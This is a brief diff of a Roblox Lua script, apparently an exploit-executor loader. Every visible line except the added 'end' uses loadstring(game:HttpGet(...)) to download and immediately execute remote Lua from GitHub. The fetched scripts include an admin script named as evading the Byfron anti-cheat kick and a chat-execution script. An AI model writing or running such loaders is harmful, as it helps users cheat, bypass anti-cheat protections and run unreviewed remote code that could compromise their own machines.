@@ -4,3 +4,4 @@ game.Players.LocalPlayer.PlayerGui.ScreenGui:Destroy()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FD2Team/Nameless-Admin-No-Byfron-Kick/main/Source",true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/crceck123/roblox-script/main/chatexec_mobile.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/crceck123/roblox-script/main/myscripts.lua"))()
+end
